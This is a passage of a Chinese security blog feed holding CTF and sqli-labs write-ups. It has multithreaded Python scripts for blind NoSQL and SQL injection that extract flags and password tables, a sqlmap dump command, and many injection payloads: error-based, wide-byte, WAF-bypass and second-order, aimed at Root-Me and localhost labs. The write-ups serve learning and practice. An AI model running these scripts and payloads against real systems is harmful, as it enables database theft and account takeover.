requests,threading,queue,time,string</span><br><span class="line">SHARE_Q=queue.Queue()</span><br><span class="line">payload=&quot;&quot;</span><br><span class="line">next=False</span><br><span class="line">class worker(threading.Thread):</span><br><span class="line">def __init__(self,func):</span><br><span class="line">threading.Thread.__init__(self)</span><br><span class="line">self.func=func</span><br><span class="line">def run(self):</span><br><span class="line">self.func()</span><br><span class="line">def scan():</span><br><span class="line">global SHARE_Q</span><br><span class="line">global payload</span><br><span class="line">global next</span><br><span class="line">if next==True:</span><br><span class="line">next=False</span><br><span class="line">return</span><br><span class="line">url=&quot;http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&amp;flag[$regex]=^(&#123;&#125;)&quot;</span><br><span class="line">while not SHARE_Q.empty():</span><br><span class="line">i=SHARE_Q.get(timeout=1)</span><br><span class="line">print(&#x27;[url]:&#x27;+payload+i)</span><br><span class="line">r=requests.get(url.format(payload+i))</span><br><span class="line">if &#x27;Yeah&#x27; in r.text:</span><br><span class="line">payload+=i</span><br><span class="line">print(&#x27;[payload]:&#x27;+payload)</span><br><span class="line">SHARE_Q.queue.clear()</span><br><span class="line">next=True</span><br><span class="line">SHARE_Q.task_done()</span><br><span class="line">return</span><br><span class="line">SHARE_Q.task_done()</span><br><span class="line">def main():</span><br><span class="line">global SHARE_Q</span><br><span class="line">threads=[]</span><br><span class="line">while True:</span><br><span class="line">for i in string.printable[:-6]:</span><br><span class="line">if i in &#x27;*.?+$^[]()&#123;&#125;|\\/&#x27;:</span><br><span class="line">SHARE_Q.put(&#x27;\\&#x27;+i)</span><br><span class="line">else:</span><br><span class="line">SHARE_Q.put(i)</span><br><span class="line">for i in range(10):</span><br><span class="line">thread=worker(scan)</span><br><span class="line">thread.start()</span><br><span class="line">threads.append(thread)</span><br><span class="line">for thread in threads:</span><br><span class="line">thread.join()</span><br><span class="line">SHARE_Q.join()</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="52-SQL-injection-Time-based"><a href="#52-SQL-injection-Time-based" class="headerlink" title="52.SQL injection - Time based"></a>52.SQL injection - Time based</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch40/" title="http://challenge01.root-me.org/web-serveur/ch40/">http://challenge01.root-me.org/web-serveur/ch40/</a><br>[+]Statement:获取管理员密码<br>[+]Solution:在member页面可以注入，根据提示只能时间注入，放在sqlmap里跑即可。<br>[+]Payload: &amp;#x20;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge01.root-me.org/web-serveur/ch40/?action=member&amp;member=1&quot; -v3 -D public -T users --dump</span><br></pre></td></tr></table></figure><h2 id="53-SQL-injection-blind"><a href="#53-SQL-injection-blind" class="headerlink" title="53.SQL injection - blind"></a>53.SQL injection - blind</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch10/" title="http://challenge01.root-me.org/web-serveur/ch10/">http://challenge01.root-me.org/web-serveur/ch10/</a><br>[+]Statement:获得管理员密码<br>[+]Solution:这个页面注册时可以注入登录，因此可以利用基于boolen的注入一步步猜解出数据库信息<br>[+]Payload:盲注脚本如下 &amp;#x20;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">import requests,string,threading,queue,time</span><br><span class="line">url=&quot;http://challenge01.root-me.org/web-serveur/ch10/&quot;</span><br><span class="line">username=&#x27;&#x27;</span><br><span class="line">password=&#x27;&#x27;</span><br><span class="line">payload=&#x27;&#x27;</span><br><span class="line">next=False</span><br><span class="line">class myThread(threading.Thread):</span><br><span class="line">    &quot;&quot;&quot;docstring for myThread&quot;&quot;&quot;</span><br><span class="line">    def __init__(self, func,queue):</span><br><span class="line">        super(myThread, self).__init__()</span><br><span class="line">        self.func=func</span><br><span class="line">        self.queue=queue</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            data=self.queue.get()</span><br><span class="line">            self.func(data)</span><br><span class="line">            self.queue.task_done()</span><br><span class="line">def work(data):</span><br><span class="line">    i,j,k=data</span><br><span class="line">    global next,payload</span><br><span class="line">    #username=&quot;1&#x27; or substr((select sql FROM sqlite_master where type=&#x27;table&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; --+&quot;.format(j,i)</span><br><span class="line">    username=&quot;1&#x27; or substr((select username||&#x27;:&#x27;||password FROM  users limit &#123;&#125;,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; --+&quot;.format(k,j,i)</span><br><span class="line">    print(username)</span><br><span class="line">    data=&#123;&quot;username&quot;:username,&quot;password&quot;:&#x27;1&#x27;&#125;</span><br><span class="line">    </span><br><span class="line">    page = &#x27;&#x27;</span><br><span class="line">    while page == &#x27;&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            page = requests.post(url,data=data)</span><br><span class="line">            break</span><br><span class="line">        except:</span><br><span class="line">            print(&quot;Connection refused by the server..&quot;)</span><br><span class="line">            print(&quot;Let me sleep for 5 seconds&quot;)</span><br><span class="line">            print(&quot;ZZzzzz...&quot;)</span><br><span class="line">            time.sleep(5)</span><br><span class="line">            print(&quot;Was a nice sleep, now let me continue...&quot;)</span><br><span class="line">            continue</span><br><span class="line">    </span><br><span class="line">    if &#x27;Welcome&#x27; in page.text:</span><br><span class="line">        payload+=i</span><br><span class="line">        print(payload)</span><br><span class="line">        next=True</span><br><span class="line">q=queue.Queue(5)</span><br><span class="line">for i in range(5):</span><br><span class="line">        thread=myThread(work,q)</span><br><span class="line">        thread.start()</span><br><span class="line">        #threads.append(thread)</span><br><span class="line">&#x27;&#x27;&#x27;for j in range(1,100):</span><br><span class="line">    if next==True:</span><br><span class="line">        next=False</span><br><span class="line">    for i in string.printable[:-5]:</span><br><span class="line">        if next==False:</span><br><span class="line">            q.put([i,j])</span><br><span class="line">            #print(&quot;&#123;&#125; is put&quot;.format(j))</span><br><span class="line">        else:</span><br><span class="line">            next=False</span><br><span class="line">            break</span><br><span class="line">q.join()&#x27;&#x27;&#x27;</span><br><span class="line">for k in range(1,5):</span><br><span class="line">    for j in range(1,100):</span><br><span class="line">        if next==True:</span><br><span class="line">            next=False</span><br><span class="line">        for i in string.printable[:-5]:</span><br><span class="line">            if next==False:</span><br><span class="line">                q.put([i,j,k])</span><br><span class="line">                #print(&quot;&#123;&#125; is put&quot;.format(j))</span><br><span class="line">            else:</span><br><span class="line">                next=False</span><br><span class="line">                break</span><br><span class="line">    q.jojn()</span><br></pre></td></tr></table></figure><h2 id="54-XPath-injection-blind"><a href="#54-XPath-injection-blind" class="headerlink" title="54.XPath injection - blind"></a>54.XPath injection - blind</h2><p>[+]URL:<a href="http://challenge01.root-me.org/web-serveur/ch24/" title="http://challenge01.root-me.org/web-serveur/ch24/">http://challenge01.root-me.org/web-serveur/ch24/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab学习心得总结</title>
      <link href="/2017/12/10/sqli-lab%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97%E6%80%BB%E7%BB%93/"/>
      <url>/2017/12/10/sqli-lab%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>从sqli-lab入门Mysql注入。总结记录下我学到的知识点。</p><h2 id="0x01-注入步骤"><a href="#0x01-注入步骤" class="headerlink" title="0x01 注入步骤"></a>0x01 注入步骤</h2><ul><li>查看当前的用户名，数据库和版本号。user(),datebase(),version()</li><li>从<code>information_schema</code>中获取数据库、数据表的信息。</li><li>拖库或传Shell</li></ul><h2 id="0x02-盲注技巧"><a href="#0x02-盲注技巧" class="headerlink" title="0x02 盲注技巧"></a>0x02 盲注技巧</h2><h3 id="BoolenBased"><a href="#BoolenBased" class="headerlink" title="BoolenBased"></a>BoolenBased</h3><p><em>当参数传递正确或错误时页面的返回结果不同时，可以用这种方法。速度比TimeBased快很多。</em></p><p>payload:<code>ascii(substr((select database()),1,1))&gt;64</code></p><p><code>if(a,b,c)</code>：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0。<code>substr()</code>截取字符串，第一个参数截取字符串，第二个参数是起始位置，第三个参数是截取长度。每次查询一位，根据返回的结果判断查询条件，利用二分法查询。</p><p><code>substr(str,pos,len)</code>：str从pos位置开始截取len长度的字符进行返回.。注意这里的pos位置是从1开始的，不是数组的0开始</p><h3 id="TimeBased"><a href="#TimeBased" class="headerlink" title="TimeBased"></a>TimeBased</h3><p><em>当参数传递正确或错误时页面的返回结果相同时，可以用这种方法。速度比TimeBased快很多。</em></p><p>payload:<code>SLEEP(time)</code>、<code>BENCHMARK(count, expr)</code></p><p><code>SLEEP(time)</code>使程序等待time秒，<code>BENCHMARK（count,expr）</code>执行expr指令count次。这两个函数可以用来结合if()、ascii()、substr()等函数可以构造时间注入。</p><h2 id="0x03-双查询"><a href="#0x03-双查询" class="headerlink" title="0x03 双查询"></a>0x03 双查询</h2><p><em>适用于基于报错的某些情况下,联合查询不会直接回显查询结果时，我们可以利用双查询，把想要的信息通过报错返回。 &#x2F;&#x2F;如Less-6</em></p><h4 id="双查询使用的四个函数"><a href="#双查询使用的四个函数" class="headerlink" title="双查询使用的四个函数"></a>双查询使用的四个函数</h4><ul><li>Rand() &#x2F;&#x2F;随机函数</li><li>Floor() &#x2F;&#x2F;取整函数</li><li>Count() &#x2F;&#x2F;汇总函数</li><li>Group by clause &#x2F;&#x2F;分组函数</li></ul><p>payload:<code>select count(*), concat((select version()), floor(rand()*2))as a from information_schema.tables group by a;</code></p><p>当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</p><p>以Less-6举例</p><p>源码：</p><p><img src="/img/sql/err.png"></p><p>payload:</p><blockquote><p><a href="http://localhost/Less-6/?id=0%22%20union%20select%201,count(*),%20concat(%27%5C~%27,(select%20user()),%27%5C~%27,%20floor(rand()*2))as%20a%20from%20information_schema.tables%20group%20by%20a--+">http://localhost/Less-6/?id=0%22%20union%20select%201,count(*),%20concat(%27\~%27,(select%20user()),%27\~%27,%20floor(rand()*2))as%20a%20from%20information_schema.tables%20group%20by%20a--+</a></p></blockquote><p>result：</p><p><img src="/img/sql/err1.png"></p><p>在payload加入<code>concat()</code>是为了便于区分，同时避免有些时候返回结果显示不完全的情况。</p><h2 id="0x04-其他基于报错的注入函数"><a href="#0x04-其他基于报错的注入函数" class="headerlink" title="0x04 其他基于报错的注入函数"></a>0x04 其他基于报错的注入函数</h2><p><em>适用情况跟双查询相同</em></p><p>payload:<code>updatexml()</code>&#x2F;<code>extractvalue()</code></p><p><code>UPDATEXML (XML_document, XPath_string, new_value);</code></p><ul><li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>第二个参数：XPath_string (Xpath格式的字符串)</li><li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li><li>作用：改变文档中符合条件的节点的值</li></ul><p><code>extractvalue()</code>和前者类似。</p><p>同以Less-6举例</p><p>payload：</p><blockquote><p><a href="http://localhost/Less-6/?id=0%22%20or%20updatexml(1,concat(%22:%22,version(),1),1)%20--+">http://localhost/Less-6/?id=0%22%20or%20updatexml(1,concat(%22:%22,version(),1),1)%20--+</a></p></blockquote><p>result：</p><p><img src="/img/sql/err2.png"></p><h2 id="0x05-绕过技巧"><a href="#0x05-绕过技巧" class="headerlink" title="0x05 绕过技巧"></a>0x05 绕过技巧</h2><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p><em>对于那些使用gbk编码的页面，当源码对输入进行加斜杆的转义时,可以使用宽字节注入绕过。</em></p><p>以Less-33举例：</p><p>参数被addslashes函数转义。</p><p>payload:</p><blockquote><p><a href="http://localhost/Less-32/?id=0%EF%BF%BD%27%20union%20select%201,2,3%20--+">http://localhost/Less-32/?id=0%df%27%20union%20select%201,2,3%20--+</a></p></blockquote><p>由于mysql的特性，因为gbk是多字节编码，他认为两个字节代表一个汉字，所以%df和后面的\也就是%5c变成了一个汉字“運”，而’逃逸了出来。</p><h3 id="or-x2F-and-绕过"><a href="#or-x2F-and-绕过" class="headerlink" title="or&#x2F;and 绕过"></a>or&#x2F;and 绕过</h3><ul><li><code>||</code>&#x3D;or,<code>&amp;&amp;</code>&#x3D;and</li><li>双写绕过，如oorr\aandnd</li></ul><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><ul><li>&#x2F; **&#x2F;绕过</li><li>%a0绕过</li></ul><p>%a0绕过原理：在进行正则匹配时，匹配到它时是识别为中文字符的，所以不会被过滤掉，但是在进入SQL语句后，Mysql是不认中文字符的，所以直接当作空格处理，就这样，我们便达成了Bypass的目的，成功绕过空格+注释的过滤</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p><em>利用源码的逻辑错误注入</em></p><p>以Less-24举例</p><p>源码：</p><p><img src="/img/sql/two.png"></p><p>一个登录系统，在注册、登陆等环节都使用了<code>mysql_real_escape_string</code>函数转义，但是在如图所示的更改密码时没有检测username,我们可以利用这个逻辑错误修改一些可能存在的常见用户名（如admin、root）的密码。</p><p>以修改admin用户密码举例，注册一个用户</p><blockquote><p>username：admin’ –+</p><p>password: 123</p></blockquote><p>它在php里会被转义，但是存进数据库时还是原始值</p><p><img src="/img/sql/user1.png"></p><p>然后修改密码</p><p><img src="/img/sql/user2.png"></p><h2 id="0x06-ORDERBY从句注入技巧"><a href="#0x06-ORDERBY从句注入技巧" class="headerlink" title="0x06 ORDERBY从句注入技巧"></a>0x06 ORDERBY从句注入技巧</h2><p>orderby注入有独特的判断方法。注入的思路和之前区别不大，但是一些函数使用上有些区别。</p><p>以Less-46举例</p><p>源码：</p><p><img src="/img/sql/order1.png"></p><h3 id="简单判断"><a href="#简单判断" class="headerlink" title="简单判断"></a>简单判断</h3><p>paylaod:</p><blockquote><p><a href="http://localhost/Less-46/?sort=1%27%20or%201=1%20--+">http://localhost/Less-46/?sort=1%27%20or%201=1%20--+</a></p><p><a href="http://localhost/Less-46/?sort=1%20%20or%201=1%20--+">http://localhost/Less-46/?sort=1%20%20or%201=1%20--+</a></p><p><a href="http://localhost/Less-46/?sort=1%20%20desc">http://localhost/Less-46/?sort=1%20%20desc</a></p></blockquote><p><code>desc</code>&#x2F;<code>asc</code>观察回显的顺序，判断是否有orderby从句的注入点</p><h3 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h3><p>payload:</p><blockquote><p><a href="http://localhost/Less-46/?sort=1%20or%20%20updatexml(1,concat(0x2829,version()),1)%20--+">http://localhost/Less-46/?sort=1%20or%20%20updatexml(1,concat(0x2829,version()),1)%20--+</a></p></blockquote><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="BoolenBased-1"><a href="#BoolenBased-1" class="headerlink" title="BoolenBased"></a>BoolenBased</h4><blockquote><p><a href="http://localhost/Less-46/?sort=(select+1+regexp+if(substring(database(),1,1)=0x73,1,0x00">http://localhost/Less-46/?sort=(select+1+regexp+if(substring(database(),1,1)=0x73,1,0x00</a></p></blockquote><p><code>regexp</code>正则匹配函数</p><p>1与if语句正则匹配，database()第一个字符&#x3D;0x73为真则if为1，则regexp匹配结果为1，否则为0。</p><h4 id="TimeBased-1"><a href="#TimeBased-1" class="headerlink" title="TimeBased"></a>TimeBased</h4><blockquote><p>5,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))</p></blockquote><h2 id="Refer"><a href="#Refer" class="headerlink" title="Refer:"></a>Refer:</h2><ul><li><a href="https://www.2cto.com/article/201303/192718.html" title="双查询">双查询</a></li><li><a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" title="宽字节注入">宽字节注入</a></li><li><a href="https://www.secpulse.com/archives/57197.html" title="orderby从句注入">orderby从句注入</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab:Less29-53记录</title>
      <link href="/2017/12/09/sqli-lab-Less29-53%E8%AE%B0%E5%BD%95/"/>
      <url>/2017/12/09/sqli-lab-Less29-53%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>最近开始学习注入，从sqli-lab的题入手。前面1-28是跟着教程做的，学习了注入基本的方法和思路。后面试着自己做一下，同时留下思路和笔记。</p><h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><h3 id="GET受WAF保护单引号注入"><a href="#GET受WAF保护单引号注入" class="headerlink" title="GET受WAF保护单引号注入"></a>GET受WAF保护单引号注入</h3><p>测试：</p><p><img src="/img/sql/21.png"></p><p>结果跳转到了另一个页面,结合登录网站的图片提示，我们知道有waf。看看源码。</p><p><img src="/img/sql/12.png"></p><p>看看<code>java_implimentation</code>和<code>whitelist</code>这个两个处理传入参数的函数。</p><p><img src="/img/sql/1.png"></p><p>java_implimentation用来解析查询字符串，用<code>&amp;</code>分割参数，并只返回参数<code>id</code>的值且只返回第一次。</p><p><img src="/img/sql/guolv.png"></p><p>这是主要的检测函数，检测传入的参数是否是一个纯数字，如果不是，则判定为非法字符，跳转到特殊页面。</p><p>根据WAF规则构造出payload：</p><blockquote><p><a href="http://localhost/Less-29/login.php?id=0%5C&id=0%E2%80%98">http://localhost/Less-29/login.php?id=0\&amp;id=0‘</a>“) union select 1,2,3 –+</p></blockquote><p>前一个<code>id=0</code>用于绕过waf，而代码中执行的sql语句使用的是<code>$_GET[&#39;id&#39;]</code>,这个值取的是最后一个GET的id的值，也就是payload中&amp;后面的id的值。</p><h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><h3 id="GET受WAF保护双引号注入"><a href="#GET受WAF保护双引号注入" class="headerlink" title="GET受WAF保护双引号注入"></a>GET受WAF保护双引号注入</h3><p>这一关跟上一关差不多，区别在于sql语句使用的参数加了双引号。如下payload可以检测出：</p><blockquote><p><a href="http://localhost/Less-30/login.php?id=1%5C&id=1%22">http://localhost/Less-30/login.php?id=1\&amp;id=1%22</a>“</p></blockquote><p><img src="/img/sql/error.png"></p><p>构造payload：</p><blockquote><p><a href="http://localhost/Less-30/login.php?id=1%5C&id=0%22%20union%20select%201,2,3%20--+">http://localhost/Less-30/login.php?id=1\&amp;id=0%22%20union%20select%201,2,3%20--+</a>“</p></blockquote><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><h3 id="GET受WAF保护括号注入"><a href="#GET受WAF保护括号注入" class="headerlink" title="GET受WAF保护括号注入"></a>GET受WAF保护括号注入</h3><p>跟上面大同小异,从报错可以看出参数闭合的方式。 &amp;#x20;<br>payload：</p><blockquote><p><a href="http://localhost/Less-31/login.php?id=1%5C&id=0%22)%20union%20select%201,2,3%20--+%22)%20union%20select%201,2,3%20--+">http://localhost/Less-31/login.php?id=1\&amp;id=0%22)%20union%20select%201,2,3%20--+&quot;)%20union%20select%201,2,3%20--+</a>)</p></blockquote><h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><h3 id="GET字符型addslashes绕过注入"><a href="#GET字符型addslashes绕过注入" class="headerlink" title="GET字符型addslashes绕过注入"></a>GET字符型addslashes绕过注入</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-32/?id=1%EF%BF%BD%27">http://localhost/Less-32/?id=1%df%27</a>“</p></blockquote><p><img src="/img/sql/error1.png"></p><p>从报错看出单引号被添加了一个斜杠。</p><p>源码：</p><p><img src="/img/sql/so.png"></p><p><code>check_addslashes</code>函数：</p><p><img src="/img/sql/han.png"></p><p>参数经过<code>check_addslashes</code>函数处理，斜杠和单双引号都被添加了斜杠转义。看到执行了<code>SET NAMES gbk</code>，想到可以使用宽字节注入绕过。</p><p>payload：</p><blockquote><p><a href="http://localhost/Less-32/?id=0%EF%BF%BD%27%20union%20select%201,2,3%20--+">http://localhost/Less-32/?id=0%df%27%20union%20select%201,2,3%20--+</a>“</p></blockquote><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><h3 id="GET字符型addslashes绕过注入-1"><a href="#GET字符型addslashes绕过注入-1" class="headerlink" title="GET字符型addslashes绕过注入"></a>GET字符型addslashes绕过注入</h3><p>和Less-32注入方法一模一样，查看源码区别在于<code>check_addslashes</code>使用了php自带的函数<code>addslashes</code>，观察实际使用效果结合查询手册，学习了addslashes函数的原理。和绕过方法。</p><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><h3 id="POST字符型addslashes绕过注入"><a href="#POST字符型addslashes绕过注入" class="headerlink" title="POST字符型addslashes绕过注入"></a>POST字符型addslashes绕过注入</h3><p>和之前GET的原理相同。区别在于数据改为POST传输。</p><p>在测试中，我直接用浏览器输入<code>1%df&#39;</code>不会报错，只有在bp的repeater中修改payload再POST出去才会报错。</p><p>使用bp抓包发现，在浏览器中POST的<code>1%df&#39;</code>会被编码为<code>1%25df</code>，即<code>%</code>被编码了。这样就无法构成宽字节了。</p><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><h3 id="GET数字型addslashes绕过注入"><a href="#GET数字型addslashes绕过注入" class="headerlink" title="GET数字型addslashes绕过注入"></a>GET数字型addslashes绕过注入</h3><p>测试：</p><p><code>http://localhost/Less-35/?id=1%df%27</code></p><p>报错：</p><p><img src="/img/sql/error2.png"></p><p>源码：</p><p><img src="/img/sql/sou2.png"></p><p>发现是数字型的id，那么在注入时addslashes函数就不会起到什 &amp;#x20;<br>么作用。</p><p>payload:</p><blockquote><p><a href="http://localhost/Less-35/?id=0%20union%20select%201,2,3%20--+">http://localhost/Less-35/?id=0%20union%20select%201,2,3%20--+</a>“</p></blockquote><h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><h3 id="GET字符型mysql-real-escape-string绕过注入"><a href="#GET字符型mysql-real-escape-string绕过注入" class="headerlink" title="GET字符型mysql_real_escape_string绕过注入"></a>GET字符型mysql_real_escape_string绕过注入</h3><p>跟前几题类似，区别在于转义字符串的函数换成了<code>mysql_real_escape_string</code>,在参考手册中查一下。</p><p><img src="/img/sql/mysql_escape.png"></p><p>注入方法和之前的一样。</p><p>payload:</p><blockquote><p><a href="http://localhost/Less-36/?id=0%EF%BF%BD%27%20union%20select%201,2,3%20--+">http://localhost/Less-36/?id=0%df%27%20union%20select%201,2,3%20--+</a>“</p></blockquote><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><h3 id="POST字符型mysql-real-escape-string绕过注入"><a href="#POST字符型mysql-real-escape-string绕过注入" class="headerlink" title="POST字符型mysql_real_escape_string绕过注入"></a>POST字符型mysql_real_escape_string绕过注入</h3><p>只是换了转义函数，注入方法同Less-34。</p><h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><h3 id="GET字符型层次化查询注入"><a href="#GET字符型层次化查询注入" class="headerlink" title="GET字符型层次化查询注入"></a>GET字符型层次化查询注入</h3><p>源码：</p><p><img src="/img/sql/stacked.png"></p><p>代码使用了<code>mysqli</code>拓展连接数据库的方式。<code>mysqli_multi_query</code>执行多个sql语句，以<code>；</code>分隔。<code>mysqli_more_results</code>检查是否还有查询数据。</p><p>payload：</p><p><a href="http://localhost/Less-38/?id=0%27%20union%20select%201,2,3%20--+">http://localhost/Less-38/?id=0%27%20union%20select%201,2,3%20--+</a>“</p><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><h3 id="GET数字型层次化查询注入"><a href="#GET数字型层次化查询注入" class="headerlink" title="GET数字型层次化查询注入"></a>GET数字型层次化查询注入</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-39/?id=0%22%20union%20select%201,2,3%20--+">http://localhost/Less-39/?id=0%22%20union%20select%201,2,3%20--+</a>“</p></blockquote><p>报错：</p><p><img src="/img/sql/error3.png"></p><p>判断应为数字型注入</p><p>payload:</p><blockquote><p><a href="http://localhost/Less-39/?id=0%20union%20select%201,2,3%20--+">http://localhost/Less-39/?id=0%20union%20select%201,2,3%20--+</a>“</p></blockquote><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><h3 id="GET括号字符型层次化查询盲注"><a href="#GET括号字符型层次化查询盲注" class="headerlink" title="GET括号字符型层次化查询盲注"></a>GET括号字符型层次化查询盲注</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-40/index.php?id=0%20or%201=1%20--+">http://localhost/Less-40/index.php?id=0%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-40/index.php?id=0%27%20or%201=1%20--+">http://localhost/Less-40/index.php?id=0%27%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-40/index.php?id=0%27)%20or%201=1%20--+%22)%20or%201=1%20--+">http://localhost/Less-40/index.php?id=0%27)%20or%201=1%20--+&quot;)%20or%201=1%20--+</a>)</p></blockquote><p>前两个无回显，第三个登陆成功。</p><p>payload:</p><blockquote><p><a href="http://localhost/Less-40/index.php?id=0%27)%20union%20select%201,2,3%20--+%22)%20union%20select%201,2,3%20--+">http://localhost/Less-40/index.php?id=0%27)%20union%20select%201,2,3%20--+&quot;)%20union%20select%201,2,3%20--+</a>)</p></blockquote><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><h3 id="GET数字型层次化查询盲注"><a href="#GET数字型层次化查询盲注" class="headerlink" title="GET数字型层次化查询盲注"></a>GET数字型层次化查询盲注</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-41/?id=0%27%20or%201=1%20--+">http://localhost/Less-41/?id=0%27%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-41/?id=0%20or%201=1%20--+">http://localhost/Less-41/?id=0%20or%201=1%20--+</a>“</p></blockquote><p>判定为数字型注入</p><p>payload:</p><blockquote><p>localhost&#x2F;Less-41&#x2F;?id&#x3D;0 union select 1,2,3 –+</p></blockquote><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><h3 id="POST字符型基于错误的的层次化查询注入"><a href="#POST字符型基于错误的的层次化查询注入" class="headerlink" title="POST字符型基于错误的的层次化查询注入"></a>POST字符型基于错误的的层次化查询注入</h3><p>源码：</p><p><img src="/img/sql/escape0.png"></p><p>转义了用户名但没有转义密码，联想到之前Less-24的二次注入。但是发现这次不让注册了。。。看到会报错，尝试使用less-27学的基于报错的<code>updatexml</code>语法。</p><p>payload:</p><blockquote><p>login_user&#x3D;root&amp;login_password&#x3D;1’ or updatexml(1,concat(0x2829,(select version())),1) –+&amp;mysubmit&#x3D;Login</p><p>login_user&#x3D;root&amp;login_password&#x3D;1’ or extractvalue(1,concat(0x2829,(select version()),1) –+&amp;mysubmit&#x3D;Login</p><p>login_user&#x3D;root&amp;login_password&#x3D;1’ or updatexml(1,concat(0x2829,(select concat_ws(‘:’,id,username,password) from users limit 0,1)),1) –+&amp;mysubmit&#x3D;Login</p></blockquote><p>之后就可以登陆改密码啦。</p><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><h3 id="POST加括号字符型基于错误的的层次化查询注入"><a href="#POST加括号字符型基于错误的的层次化查询注入" class="headerlink" title="POST加括号字符型基于错误的的层次化查询注入"></a>POST加括号字符型基于错误的的层次化查询注入</h3><p>测试：</p><blockquote><p>login_user&#x3D;root&amp;login_password&#x3D;0’ or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p><p>login_user&#x3D;root&amp;login_password&#x3D;0’) or 1&#x3D;1 